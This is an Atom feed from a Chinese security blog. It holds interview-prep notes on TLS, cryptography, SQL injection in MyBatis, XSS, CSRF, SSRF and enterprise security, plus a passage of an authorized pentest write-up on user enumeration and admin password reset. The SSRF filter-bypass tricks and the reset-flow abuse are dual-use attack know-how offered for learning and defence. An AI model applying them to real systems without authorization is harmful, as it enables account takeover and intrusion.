<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>折戟</title>
  <icon>https://www.gravatar.com/avatar/8ef68a22378880474ce46579bc9fdf1a</icon>
  <subtitle>安全爱好者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://XD0ne.github.io/"/>
  <updated>2021-03-16T03:18:10.043Z</updated>
  <id>https://XD0ne.github.io/</id>
  
  <author>
    <name>折戟</name>
    <email>raosong3374@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>面试准备（实时更新）</title>
    <link href="https://XD0ne.github.io/2021/03/10/40.%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%EF%BC%88%E5%AE%9E%E6%97%B6%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://XD0ne.github.io/2021/03/10/40.面试准备（实时更新）/</id>
    <published>2021-03-09T17:00:00.000Z</published>
    <updated>2021-03-16T03:18:10.043Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h1 id="一、基础学科知识"><a href="#一、基础学科知识" class="headerlink" title="一、基础学科知识"></a>一、基础学科知识</h1><h2 id="1-1-计网基础知识"><a href="#1-1-计网基础知识" class="headerlink" title="1.1 计网基础知识"></a>1.1 计网基础知识</h2><ol><li><strong>SSL握手-</strong><a href="https://segmentfault.com/a/1190000021559557" target="_blank" rel="noopener">传送门</a></li></ol><p><img src="https://uploader.shimo.im/f/i5edWWfuzz55x8xy.png!thumbnail?fileGuid=Txh8CTKKVtTqPHry" alt="图片"></p><pre><code>* **&quot;client hello&quot;消息**：客户端通过发送&quot;client hello&quot;消息向服务器发起握手请求，该消息包含了客户端所支持的 TLS 版本和密码组合以供服务器进行选择，还有一个&quot;client random&quot;随机字符串。* **&quot;server hello&quot;消息**：服务器发送&quot;server hello&quot;消息对客户端进行回应，该消息包含了数字证书，服务器选择的密码组合和&quot;server random&quot;随机字符串。* **验证**：客户端对服务器发来的证书进行验证，确保对方的合法身份，验证过程可以细化为以下几个步骤：    * 检查数字签名    * 验证证书链 (这个概念下面会进行说明)    * 检查证书的有效期    * 检查证书的撤回状态 (撤回代表证书已失效)* **&quot;premaster secret&quot;字符串**：客户端向服务器发送另一个随机字符串&quot;premaster secret (预主密钥)&quot;，这个字符串是经过服务器的公钥加密过的，只有对应的私钥才能解密。* **使用私钥**：服务器使用私钥解密&quot;premaster secret&quot;。* **生成共享密钥**：客户端和服务器均使用 client random，server random 和 premaster secret，并通过相同的算法生成相同的共享密钥 KEY。* **客户端就绪**：客户端发送经过共享密钥 KEY加密过的&quot;finished&quot;信号。* **服务器就绪**：服务器发送经过共享密钥 KEY加密过的&quot;finished&quot;信号。* **达成安全通信**：握手完成，双方使用对称加密进行安全通信。</code></pre><h2 id="1-2-密码学知识"><a href="#1-2-密码学知识" class="headerlink" title="1.2 密码学知识"></a>1.2 密码学知识</h2><ol><li><strong>RSA-非对称</strong></li></ol><p><a href="https://bealright.github.io/2019/08/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">传送门</a></p><ul><li>随机选择两个不相等的质数p和q</li><li>计算p和q的乘积n</li><li>计算n的欧拉函数φ(n)</li><li>随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质</li><li>计算e对于φ(n)的模反元素d</li><li>将n和e封装成公钥，n和d封装成私钥</li></ul><ol start="2"><li><strong>AES、DES-对称</strong></li></ol><p><a href="https://www.jiamisoft.com/blog/24507-des3.html" target="_blank" rel="noopener">传送门</a></p><ol start="3"><li><strong>DH交换-非对称</strong></li></ol><p><a href="https://blog.csdn.net/zzminer/article/details/8571289" target="_blank" rel="noopener">传送门</a></p><h2 id="1-3-web基础知识"><a href="#1-3-web基础知识" class="headerlink" title="1.3 web基础知识"></a>1.3 web基础知识</h2><ol><li><strong>同源策略</strong></li></ol><p>同源策略SOP（同协议，同域名，同端口）</p><ol start="2"><li><strong>跨域的方法（允许跨域 script src  a herf img）</strong><ul><li>JSONP 通过回调函数来进行跨域获取最终的值（因为是使用script src来调用）</li><li>CORS 通过服务端设置 Access-Control-Allow-Origin 来设置允许的域名来进行跨域</li><li>现代浏览器常用iFrame来进行跨域</li><li>通信可以用 postMessage服务端代理来进行跨域，跨域的服务器不受控制。<h2 id="1-4-数据结构知识"><a href="#1-4-数据结构知识" class="headerlink" title="1.4 数据结构知识"></a>1.4 数据结构知识</h2></li></ul></li></ol><h1 id="二、安全攻防"><a href="#二、安全攻防" class="headerlink" title="二、安全攻防"></a>二、安全攻防</h1><h2 id="2-1-OWASP-TOP-10漏洞相关原理"><a href="#2-1-OWASP-TOP-10漏洞相关原理" class="headerlink" title="2.1 OWASP TOP 10漏洞相关原理"></a>2.1 OWASP TOP 10漏洞相关原理</h2><ol><li><strong>SQL预编译场景下的攻击和防御</strong></li></ol><p>预编译确实是防御SQL注入的有效的安全策略，但是其在一些场景下也存在一定的缺陷，且没有合理使用安全策略、方法同样会带来安全问题，并不是使用了预编译就可以完全防住sql注入。</p><p>Mybatis中使用#和$进行SQL语句组成，其中#拼接是进入预编译形式，而$是直接拼接SQL的形式。Mybatis中SQL语句以XML文件的形式在配置文件中存在，可以手动写或自动生成。</p><ul><li>Mybatis框架下易产生的三种攻击类型：-<a href="https://c0d3p1ut0s.github.io/MyBatis%E6%A1%86%E6%9E%B6%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84SQL%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">传送门</a><ul><li>模糊查询：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from news where title like ‘%#&#123;title&#125;%’</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>在这种情况下使用#程序会报错，新手程序员就把#号改成了$,这样如果java代码层面没有对用户输入的内容做处理势必会产生SQL注入漏洞。<br>正确写法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from news where tile like concat(‘%’,#&#123;title&#125;, ‘%’)</span><br></pre></td></tr></table></figure><p>*</p><pre><code>* in之后的多个参数</code></pre><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from news where id in (#&#123;ids&#125;)</span><br></pre></td></tr></table></figure><p>正确用法为使用foreach，而不是将#替换为$<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id in&lt;foreach collection=&quot;ids&quot; item=&quot;item&quot; open=&quot;(&quot;separatosr=&quot;,&quot; close=&quot;)&quot;&gt;#&#123;ids&#125; &lt;/foreach&gt;</span><br></pre></td></tr></table></figure></p><p>*</p><pre><code>* order by 之后</code></pre><p>SQL语句中的一些部分，例如order by字段、表名等，是无法使用预编译语句的。这种场景极易产生SQL注入。这种场景应当在Java层面做映射，设置一个字段/表名数组，仅允许用户传入索引值。这样保证传入的字段或者表名都在白名单里面。需要注意的是在mybatis-generator自动生成的SQL语句中，order by使用的也是$，而like和in没有问题。</p><ol start="2"><li><strong>XSS的原理以及防御</strong></li></ol><ul><li><strong>原理</strong></li></ul><p>攻击者通过“html”注入，使服务器将用户输入的数据当成代码，攻击者篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，恶意脚本被执行。</p><pre><code>* 反射型XSS* 存储型XSS* DOM Based XSS</code></pre><ul><li><strong>反射型XSS和DOM型XSS的区别</strong></li></ul><p>DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><ul><li><strong>防御手段</strong><ul><li>httponly：浏览器禁止javascript访问httponly的cookie</li><li>输入检测<ul><li>白名单，格式限制（服务端和客户端都得做检查）</li><li>XSS Filter</li><li>富文本：标签白名单、CSS检测</li></ul></li><li>输出检查<ul><li>htmlEncode</li></ul></li><li>内容安全策略-CSP</li><li>Automatic Context-Aware Escaping</li></ul></li></ul><p>所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。</p><pre><code>* DOM Based XSS的防御</code></pre><p>安全开发规范。比如在使用 .innerHTML、.outerHTML、document.write()时要特别小心，不要把不可信的数据作为HTML插到页面上，而应尽量使用.textContent、.setAttribute() 等。</p><h2 id="2-2-CSRF"><a href="#2-2-CSRF" class="headerlink" title="2.2 CSRF"></a>2.2 CSRF</h2><ol><li><strong>原理</strong></li></ol><p>即用户登录了A网站，攻击者在B网站恶意构造了一个A网站的请求（比如删除帖子之类的），然后诱导用户在B网站上点击该链接则用户就会在不知情的情况下进行了一些操作（往往是写操作）。</p><ol start="2"><li><strong>防御</strong></li></ol><ul><li>服务端<ul><li>验证码<ul><li>影响用户体验，不是最优选择</li></ul></li><li>referer check<ul><li>referer也是用户可控，虽有浏览器限制，但任不可信。可用于监控CSRF的发生，并不能有效防御CSRF</li></ul></li><li>Token—一致做法<ul><li>不可预测性</li><li>并不是防止重复提交，可以是生命周期形式，不一定要是一次性</li><li>防止Token泄露（比如被修改了的恶意referer造成泄露），GET改POST</li></ul></li></ul></li><li>客户端（浏览器）<ul><li>SameSite-<a href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&amp;mid=2247484949&amp;idx=1&amp;sn=73f32260765596aa0fe773c755561308&amp;chksm=96f41978a183906e0b4f21fddcbe2d19f667b6e6cf2bdb66160a744d161a7bac7b420acac005&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1588122156973&amp;sharer_shareid=a7d99c78943a626e64cade4860efb7d9#rd" target="_blank" rel="noopener">传送门</a></li></ul></li><li><strong>json形式的CSRF</strong></li><li><strong>Django的CSRF防御方案</strong></li></ul><p><a href="https://zhuanlan.zhihu.com/p/24277595" target="_blank" rel="noopener">传送门</a>，CSRF的防御方案一般来说都是token的形式，但是在设计一个CSRF防御体系的时候就需要考虑很多，总结为以下几点：</p><pre><code>* token生成和存储* token的验证* token的更新</code></pre><p>Django的CSRF防御方案中，针对所有的POST的请求都会要求加上csrf_token，对GET请求没有CSRF防御，GET请求在如果在链接中添加token，存在token泄露的风险。且GET请求一般不涉及写操作，在开发规范中限制只有POST请求涉及写操作。</p><h2 id="2-3-SSRF"><a href="#2-3-SSRF" class="headerlink" title="2.3 SSRF"></a>2.3 SSRF</h2><p><a href="https://hackmd.io/@Lhaihai/H1B8PJ9hX" target="_blank" rel="noopener">传送门</a></p><ol><li><strong>原理</strong></li></ol><p>服务器请求伪造，即在正常的业务功能中可能会接受用户传入的url，服务器进行访问，攻击者可以利用此漏洞使用服务器为代理，或攻击内网，或作为攻击代理。所有能发起请求的地方都可能存在该漏洞。</p><p>比如：业务场景、从URL上传图片、订阅RSS、爬虫、预览、离线下载、数据库内置功能、邮箱服务器、文件处理、编码处理、属性处理。</p><p>协议：file、dict（打redis）、ftp、ftps、tftp、telnet、Gopher、smb、imp等。</p><ol start="2"><li><strong>防御</strong></li></ol><ul><li><strong>限制协议（比如仅http/https）</strong></li><li><strong>禁止30x跳转</strong></li><li><strong>设置URL/IP白名单</strong></li><li><strong>威胁情报IOC黑名单 + 流量检测</strong><ul><li>在一些业务场景下可能不能使用域名白名单的情况，则需要使用利用威胁情报设置域名黑名单，防止被攻击者恶意利用。</li></ul></li><li><strong>针对DNS重绑定的防御</strong></li></ul><p>1.TTL=0的域名服务商  2.概率论，解析两个ip   3. 自建DNS</p><pre><code>* 威胁情报IOC域名黑名单 + 流量检测* 恶意DNS服务器限制。黑名单/白名单根据业务场景考虑</code></pre><ol start="3"><li><strong>一些绕过手段</strong></li></ol><ul><li><strong>更改IP地址写法</strong><ul><li><strong>其他进制写法：</strong>8进制格式：0300.0250.0.1</li><li>省略模式：ipv6绕过、127.1、127.0.0.1.、0</li></ul></li><li><strong>利用解析URL出现的问题</strong><ul><li>在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。</li></ul></li></ul><p><a href="http://www.baidu.com@192.168.0.1/与http://192.168.0.1请求的都是192.168.0.1的内容" target="_blank" rel="noopener">http://www.baidu.com@192.168.0.1/与http://192.168.0.1请求的都是192.168.0.1的内容</a></p><ul><li><strong>利用302跳转</strong><ul><li>302跳转</li><li><a href="http://xip.io和xip.name当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。" target="_blank" rel="noopener">http://xip.io和xip.name当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</a></li></ul></li><li><strong>使用非http协议</strong><ul><li>DNS重绑定<h2 id="2-4-JAVA相关漏洞以及技术栈"><a href="#2-4-JAVA相关漏洞以及技术栈" class="headerlink" title="2.4 JAVA相关漏洞以及技术栈"></a><strong>2.4 JAVA相关漏洞以及技术栈</strong></h2></li></ul></li></ul><h2 id="2-5-工具相关"><a href="#2-5-工具相关" class="headerlink" title="2.5 工具相关"></a><strong>2.5 工具相关</strong></h2><ol><li><strong>工具观</strong></li></ol><ul><li>第一种，知道一个工具是用底层或者其它层的哪些协议/功能的特性去进行测试/工作的，就可以根据当前的需求去找工具对应参数去进行测试/使用，存在不支持的就可以自己修改代码去做。</li><li>第二种，很了解某个工具，熟悉这个工具各类参数，那在场景中就根据需求去选择参数，但是如果存在参数方法无法做到的情况，人也无法做到，人被工具局限。</li></ul><ol start="2"><li><strong>nmap的痛点/缺点/使用时的问题</strong></li></ol><p>在需要超时时长较长以及扫描主机数量很大时，使用nmap是很耗时的，因此我们会使用python来多主机调用nmap，或者dnmap，openvas中分布式调用nmap来进行扫描。其是就是大规模整体调度的问题。</p><ol start="3"><li><p><strong>sqlmap的痛点/缺点/使用时的问题</strong></p><h2 id="2-6-windows技术栈"><a href="#2-6-windows技术栈" class="headerlink" title="2.6 windows技术栈"></a><strong>2.6 windows技术栈</strong></h2></li><li><p><strong>SMB协议</strong></p></li><li><strong>Kerberos协议原理</strong></li><li><strong>域知识</strong><h2 id="2-7-SRC情况-渗透场景-业务安全对抗场景"><a href="#2-7-SRC情况-渗透场景-业务安全对抗场景" class="headerlink" title="2.7 SRC情况/渗透场景/业务安全对抗场景"></a>2.7 SRC情况/渗透场景/业务安全对抗场景</h2></li></ol><h1 id="三、研发技术栈"><a href="#三、研发技术栈" class="headerlink" title="三、研发技术栈"></a>三、研发技术栈</h1><h2 id="3-1-前后端相关"><a href="#3-1-前后端相关" class="headerlink" title="3.1 前后端相关"></a>3.1 前后端相关</h2><ol><li><strong>前端与后端</strong></li><li><p><strong>前后端交互</strong></p><ul><li>AJAX前后端交互<ul><li>创建XMLHTTPRequest对象</li><li>使用open方法设置和服务器的交互信息</li><li>设置发送的数据，开始和服务器端交互</li><li>注册事件</li><li>更新界面</li></ul></li><li>websocket<ul><li>客户端通过HTTP请求服务器网页；</li><li>客户端接收请求的网页并在页面上执行JavaScript，该页面从服务器请求文件。</li><li>当任意端新数据可用时，服务器和客户端可以相互发送消息（所以这个是双向的客户端和服务器连接，及可以互相推送消息）。</li><li>从服务器到客户端以及从客户端到服务器的实时流量，服务器端支持event loop，使用WebSockets，可以跨域连接服务器。</li></ul></li><li>eventSource<ul><li>客户端通过HTTP请求服务器网页；</li><li>客户端接收请求的网页并在页面上执行JavaScript，该页面从服务器请求文件；</li><li>从服务器到客户端的实时流量，服务器端支持event loop，推送消息（所以这个是单向的服务器推送）。注意只有正确的CORS设置才能与来自其他域的服务器建立连接。<h2 id="3-2-MVC框架"><a href="#3-2-MVC框架" class="headerlink" title="3.2 MVC框架"></a><strong>3.2 MVC框架</strong></h2></li></ul></li></ul></li><li><p><strong>MVC介绍</strong></p></li></ol><p><img src="https://uploader.shimo.im/f/JynRuJhxhAH2mxDX.png!thumbnail?fileGuid=Txh8CTKKVtTqPHry" alt="图片"></p><pre><code>* Model（模型）表示应用程序核心，用于处理应用程序数据逻辑的部分，通常模型对象负责在数据库中存取数据。* View（视图）显示数据，是应用程序中处理数据显示的部分。通常视图是依据模型数据创建的。* Controller（控制器）是应用程序中处理用户交互的部分。通常控制器负责从视图读取数据，控制用户输入，并向模型发送数据。</code></pre><ol start="2"><li><strong>Spring MVC</strong></li></ol><p><a href="https://www.jianshu.com/p/0b157b3e110b" target="_blank" rel="noopener">传送门</a></p><p>Spring web mvc和Struts2都属于表现层的框架,它是Spring框架的一部分,我们可以从Spring的整体结构中看得出来:</p><p><img src="https://uploader.shimo.im/f/lWdGM833sE5H3A67.png!thumbnail?fileGuid=Txh8CTKKVtTqPHry" alt="图片"></p><ul><li><strong>Spring web mvc架构</strong><ul><li>处理流程图</li></ul></li></ul><p><img src="https://uploader.shimo.im/f/FIanmK2cJIHDwOIU.png!thumbnail?fileGuid=Txh8CTKKVtTqPHry" alt="图片"></p><pre><code>* 流程    * 用户发送请求至前端控制器DispatcherServlet.    * DispatcherServlet收到请求调用HandlerMapping处理器映射器.    * 处理器映射器找到具体的处理器，生成处理器对象及处理器拦截器(如果有则生成)一并返回给DispatcherServlet.    * DispatcherServlet调用HandlerAdapter处理器适配器.    * HandlerAdapter经过适配调用具体的处理器(Controller，也叫后端控制器).    * Controller执行完成返回ModelAndView.    * HandlerAdapter将controller执行结果ModelAndView返回给DispatcherServlet.    * DispatcherServlet将ModelAndView传给ViewReslover视图解析器.    * ViewReslover解析后返回具体View.    * DispatcherServlet根据View进行渲染视图（即将模型数据填充至视图中）。    * DispatcherServlet响应用户</code></pre><ol start="3"><li><h1 id="四、企业安全建设"><a href="#四、企业安全建设" class="headerlink" title="四、企业安全建设"></a>四、企业安全建设</h1></li></ol><h2 id="4-1-权限设计"><a href="#4-1-权限设计" class="headerlink" title="4.1 权限设计"></a>4.1 权限设计</h2><ol><li><strong>自主访问控制（DAC）</strong></li></ol><p>根据权限表来判断用户是否有某对象的哪些权限。</p><ol start="2"><li><strong>强制访问控制（MAC）</strong></li></ol><p>用户与对象都有权限标致。</p><ol start="3"><li><strong>基于角色的访问控制（RBAC）</strong></li></ol><p>每个用户关联一个或多个角色，每个角色关联一个或多个权限，从而可以实现了非常灵活的权限管理。</p><ol start="4"><li><strong>基于属性的权限验证（ABAC）</strong></li></ol><p><a href="https://www.jianshu.com/p/ce0944b4a903" target="_blank" rel="noopener">https://www.jianshu.com/p/ce0944b4a903</a></p><h2 id="4-2-安全评估"><a href="#4-2-安全评估" class="headerlink" title="4.2 安全评估"></a>4.2 安全评估</h2><ol><li><strong>威胁分析</strong></li></ol><ul><li>STRIDE模型</li></ul><table><thead><tr><th style="text-align:left">威胁</th><th style="text-align:left">定义</th><th style="text-align:left">对应的安全属性</th></tr></thead><tbody><tr><td style="text-align:left">Spoofing（伪装）</td><td style="text-align:left">冒充他人身份</td><td style="text-align:left">认证</td></tr><tr><td style="text-align:left">Tampering（篡改）</td><td style="text-align:left">修改数据或代码</td><td style="text-align:left">完整性</td></tr><tr><td style="text-align:left">Repudiation（抵赖）</td><td style="text-align:left">否认做过的事</td><td style="text-align:left">不可抵赖性</td></tr><tr><td style="text-align:left">Information Disclosure（信息泄露）</td><td style="text-align:left">机密信息泄露</td><td style="text-align:left">机密性</td></tr><tr><td style="text-align:left">Denial of Service（拒绝服务）</td><td style="text-align:left">拒绝服务</td><td style="text-align:left">可用性</td></tr><tr><td style="text-align:left">Elevation of Privilege（提升权限）</td><td style="text-align:left">未经授权获得许可</td><td style="text-align:left">授权</td></tr></tbody></table><ol start="2"><li><strong>风险评估</strong></li></ol><ul><li>DREAD模型</li></ul><p>risk = D + R + E + A + D</p><table><thead><tr><th style="text-align:left">等级</th><th style="text-align:left">高（3）</th><th style="text-align:left">中（2）</th><th style="text-align:left">低（1）</th></tr></thead><tbody><tr><td style="text-align:left">Damage Potential</td><td style="text-align:left">获取完全验证权限，执行管理员操作，非法上传文件</td><td style="text-align:left">泄露敏感信息</td><td style="text-align:left">泄露其他信息</td></tr><tr><td style="text-align:left">Reproducibility</td><td style="text-align:left">攻击者可以随意再次攻击</td><td style="text-align:left">攻击者可以重复攻击，但有时间限制</td><td style="text-align:left">攻击者很难重复攻击过程</td></tr><tr><td style="text-align:left">Exploitability</td><td style="text-align:left">初学者短期能掌握攻击方法</td><td style="text-align:left">熟练的攻击者才能完成这次攻击</td><td style="text-align:left">漏洞利用条件非常苛刻</td></tr><tr><td style="text-align:left">Affected users</td><td style="text-align:left">所有用户，默认配置，关键用户</td><td style="text-align:left">部分用户，非默认配置</td><td style="text-align:left">极少数用户，匿名用户</td></tr><tr><td style="text-align:left">Discoverability</td><td style="text-align:left">漏洞很显眼，攻击条件很容易获得</td><td style="text-align:left">在私有区域，部分人能看到，需要深入挖掘漏洞</td><td style="text-align:left">发现漏洞极其困难</td></tr></tbody></table><h2 id="4-3-安全运营"><a href="#4-3-安全运营" class="headerlink" title="4.3 安全运营"></a>4.3 安全运营</h2><h2 id="4-4-SDLC"><a href="#4-4-SDLC" class="headerlink" title="4.4 SDLC"></a>4.4 SDLC</h2><p><img src="https://uploader.shimo.im/f/eLjXt3SnMMOTdCty.png!thumbnail?fileGuid=Txh8CTKKVtTqPHry" alt="图片"></p><p>SDLC是一个模型，不断进化，decsecops是一种具体的方法论。SDLC发展会有传统的瀑布模式，还有适应快速开发的敏捷模式。</p><ol><li><strong>白盒审计</strong></li></ol><p>实际上，对于甲方公司来说，完全可以根据开发规范来定制代码审计工具。其核心思想是，<strong>并非直接检查代码是否安全，而是检查开发者是否遵守了开发规范。</strong></p><h2 id="4-5-Devops-Devsecops"><a href="#4-5-Devops-Devsecops" class="headerlink" title="4.5 Devops/Devsecops"></a><strong>4.5 Devops/Devsecops</strong></h2><p><a href="https://cloud.tencent.com/developer/news/456611" target="_blank" rel="noopener">传送门</a>-百度</p><p><a href="https://security.tencent.com/index.php/blog/msg/150" target="_blank" rel="noopener">传送门</a>-腾讯</p><ol><li><strong>Devops</strong></li></ol><p><img src="https://uploader.shimo.im/f/U7DFqdg5EjZSL3CQ.png!thumbnail?fileGuid=Txh8CTKKVtTqPHry" alt="图片"></p><p>瀑布模式就是  设计-开发-测试-部署</p><p>敏捷模式就是  设计-开发-测试-部署—开发-测试-部署—开发-测试-部署</p><p>DEVOPS就是  设计-（开发、测试、部署）—（开发、测试、部署）</p><p><img src="https://uploader.shimo.im/f/2IMee5RYldcn02LC.png!thumbnail?fileGuid=Txh8CTKKVtTqPHry" alt="图片"></p><ol start="2"><li><strong>Devsecops</strong></li></ol><p>SDLC是软件生命开发周期模型，Devsecops是模式、框架、方法。其是SDL各阶段的全流程覆盖的、高自动化集成、强调安全与业务协同的业务安全保障框架。</p><pre><code>* 安全左移* 默认安全* 运行时安全* 安全服务自动化/自助化* 利用基础设施即代码* 利用持续集成和交付* 需要组织和文化建设</code></pre><h2 id="4-6-入侵检测"><a href="#4-6-入侵检测" class="headerlink" title="4.6 入侵检测"></a>4.6 入侵检测</h2><p><a href="https://tech.meituan.com/2018/11/08/intrusion-detection-security-meituan.html" target="_blank" rel="noopener">传送门</a></p><p>入侵行为和正常行为的区别：微博案例   黑白名单？业务历史行为（基线模型），异常对比，非黑即白</p><p>告警：聚和 联动</p><p>海量告警：漏报、误报  漏报解决：多个模型，性价比高</p><p>检测策略</p><h2 id="4-7-数据安全与隐私保护"><a href="#4-7-数据安全与隐私保护" class="headerlink" title="4.7 数据安全与隐私保护"></a>4.7 数据安全与隐私保护</h2><ol><li><strong>数据安全能力成熟度模型</strong></li></ol><p><img src="https://uploader.shimo.im/f/83pqMDSe8I1W84tS.png!thumbnail?fileGuid=Txh8CTKKVtTqPHry" alt="图片"></p><p><img src="https://uploader.shimo.im/f/eTdKIjTMzUe3Ftky.png!thumbnail?fileGuid=Txh8CTKKVtTqPHry" alt="图片"></p><h2 id="4-8-办公网安全"><a href="#4-8-办公网安全" class="headerlink" title="4.8 办公网安全"></a>4.8 办公网安全</h2><h2 id="4-9-活动反作弊"><a href="#4-9-活动反作弊" class="headerlink" title="4.9 活动反作弊"></a>4.9 活动反作弊</h2><ol><li><strong>网易活动反作弊-</strong><a href="https://dun.163.com/news/p/fymd" target="_blank" rel="noopener">传送门</a><ul><li><strong>行为式验证码</strong></li><li><strong>注册/登录保护</strong></li><li><strong>营销反作弊</strong><ul><li>设备/手机号/邮箱/ip黑名单</li><li>模拟器/多开工具/群控识别</li><li>设备篡改识别（root、Xposed、越狱等）</li><li>具体业务风险模型</li></ul></li><li><strong>实人信息认证</strong></li></ul></li><li><strong>支付宝小程序营销反作弊-</strong><a href="https://opendocs.alipay.com/open/20181026132918550659/intro" target="_blank" rel="noopener">传送门</a><ul><li>身份特质<ul><li>基础身份特质</li><li>垃圾注册</li></ul></li><li>交易历史<ul><li>作弊交易</li><li>交易链路异常/交易特征</li></ul></li><li>交易方风险<ul><li>交易方可信</li><li>团伙模型</li></ul></li><li>资金链路<ul><li>资金闭环</li><li>资金网络</li></ul></li><li>时空介质<ul><li>设备模拟器/介质关系</li><li>LBS异常</li></ul></li></ul></li><li><strong>反欺诈技术体系</strong></li></ol><p><a href="https://www.cnwebe.com/articles/93581.html" target="_blank" rel="noopener">传送门</a></p><p><img src="https://uploader.shimo.im/f/lH1vLlAqagfouMv3.png!thumbnail?fileGuid=Txh8CTKKVtTqPHry" alt="图片"></p><p><img src="https://uploader.shimo.im/f/EbAMxhwkkO2EFvII.png!thumbnail?fileGuid=Txh8CTKKVtTqPHry" alt="图片"></p><h2 id="4-10-企业安全建设思路"><a href="#4-10-企业安全建设思路" class="headerlink" title="4.10 企业安全建设思路"></a>4.10 企业安全建设思路</h2><ol><li><strong>梳理拓扑、技术栈</strong></li><li><strong>了解业务</strong></li><li><strong>安全建设</strong><ul><li>网络-hids、告警elk、waf</li><li>主机-nids、补丁、升级</li><li>应用-sdl、rasp（还有容器、源）</li><li>办公网-蜜罐、安全培训</li><li>物理安全-灾备，两地三中心等</li></ul></li><li><strong>安全能力输出</strong><ul><li>以人载体输出安全能力</li><li>以安全产品为载体输出安全能力</li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;

&lt;h1 id=&quot;一、基础学科知识&quot;&gt;&lt;a href=&quot;#一、基础学科知识&quot; class=&quot;headerlink&quot; title=&quot;一、基础学科知识&quot;&gt;&lt;/a&gt;一、基础学科知识&lt;/h1&gt;&lt;h2
      
    
    </summary>
    
      <category term="面试" scheme="https://XD0ne.github.io/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
      <category term="面试" scheme="https://XD0ne.github.io/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>从用户枚举到任意用户密码修改</title>
    <link href="https://XD0ne.github.io/2020/11/10/39.%E4%BB%8E%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%88%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/"/>
    <id>https://XD0ne.github.io/2020/11/10/39.从用户枚举到任意用户密码修改/</id>
    <published>2020-11-09T17:00:00.000Z</published>
    <updated>2020-11-09T17:57:14.041Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="从用户枚举到任意用户密码修改"><a href="#从用户枚举到任意用户密码修改" class="headerlink" title="从用户枚举到任意用户密码修改"></a>从用户枚举到任意用户密码修改</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近一次授权的渗透测试，该网站只有一个后台，对系统进行探测只开放了80和443，规范的端口开放，也只能从web应用进行进一步测试了。只有一个后台只能从登陆的相关业务点去突破了。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><p>web后台如下，在没有账号的情况下，我们只能通过在正常的登录逻辑中寻找漏洞。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-1e63c2360912eee4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="后台"><br>可以看到当前页面只有两个功能，一个是登录一个是忘记密码，通过测试发现并没有对登录次数失败进行限制，但是想要爆破用户名再爆破密码无疑是个不可完成的工作量。那只能忘记密码的功能处突破了。<br>先描述一遍忘记密码的逻辑：</p><ol><li>输入一个手机号，然后输入验证码。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-aeca37022f361f45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="忘记密码"><br>但是此处的判断逻辑存在一定的问题，填写手机号后和呀验证码之后发送请求，先判断该手机号是否已经注册，未注册则返回用户不存在，注册了则会校验验证码是否正确。在此我们找到了存在一个11111111111的测试账号。由此此处存在一个逻辑漏洞导致用户名可被暴力枚举。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b1a42afd3300e64c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="用户不存在"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-9c5a9b559f1f33c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="验证码错误"></li><li>填入收到的短信验证码，修改密码<br><img src="https://upload-images.jianshu.io/upload_images/6269327-e243300844f48369.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>另外还有一个收获，在测试用户名枚举时，尝试mobile参数为admin显示该用户存在（需在抓包软件处修改，前端校验手机号），很可能后台默认是使用手机号当用户名，实际的参数为username而非mobile，所以这里传入admin用户名可对管理员密码进行重置。<h3 